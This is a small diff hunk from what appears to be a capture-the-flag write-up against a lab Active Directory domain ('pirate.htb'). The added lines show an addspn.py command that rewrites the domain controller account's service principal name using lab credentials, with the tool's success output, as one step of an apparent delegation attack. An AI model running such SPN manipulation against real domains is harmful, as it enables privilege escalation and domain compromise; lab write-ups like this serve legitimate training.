@@ -694,6 +694,17 @@ DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb - STATUS: Read - READ TIME: 2026-09-2
 Ill first clear the SPNs
 
 ```python
+python3 addspn.py -t 'dc01$' --spn 'HTTP/WEB01.pirate.htb' -u 'pirate.htb\a.white_adm' -p 'Password123!' '10.129.244.95'
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+```
+
+Then ill add the SPN for the DC
+
+```python
 
 ```
 
